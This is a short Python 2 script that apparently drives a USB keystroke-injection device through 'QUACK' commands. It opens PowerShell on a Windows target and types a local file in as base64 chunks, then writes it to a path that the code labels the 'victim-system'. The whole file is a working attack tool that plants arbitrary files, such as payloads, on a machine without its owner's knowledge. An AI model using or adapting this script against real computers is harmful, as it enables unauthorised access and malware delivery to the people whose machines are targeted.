#!/usr/bin/env python
import base64
import time
import sys
import os

chunk_size = 1500
start = time.time()

def usage():
    print "\nUSAGE:\n------\n{os.path.basename(__file__)} [LOCAL FILEPATH] [REMOTE FILEPATH]\n"
    quit()

# CHECK CMD-LINE ARGS
if len(sys.argv) != 3:
    usage()
else:
    file = sys.argv[1]
    remote = sys.argv[2].replace("\\", "\\\\")

with open(file, "rb") as f:
    data = f.read()
    b64 = base64.b64encode(data).decode("UTF-8")

# Split into Base64 encoded string into chunks 
chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]

# Open powershell
print "OPENING powershell.exe"
os.system("QUACK GUI r")
time.sleep(1.5)
os.system("QUACK STRING powershell.exe")
os.system("QUACK ENTER")
time.sleep(1.5)

# Run upload
os.system('QUACK STRING \$b=\\"\\"')
os.system('QUACK ENTER')

max = len(chunks)
ctr = 0
for chunk in chunks:
    ctr += 1
    os.system('QUACK STRING \$b+=\\"'+chunk+'\\"')
    os.system('QUACK ENTER')
    print "SENDING CHUNK "+str(ctr)+" / "+str(max)+" ... DONE"

# Write file on victim-system
os.system('QUACK STRING [IO.File]::WriteAllBytes\(\\"'+remote+'\\", [Convert]::FromBase64String\(\$b\)\)\\; exit\\;')
os.system('QUACK ENTER')
print "DONE IN "+str(time.time() - start)+" SEC."
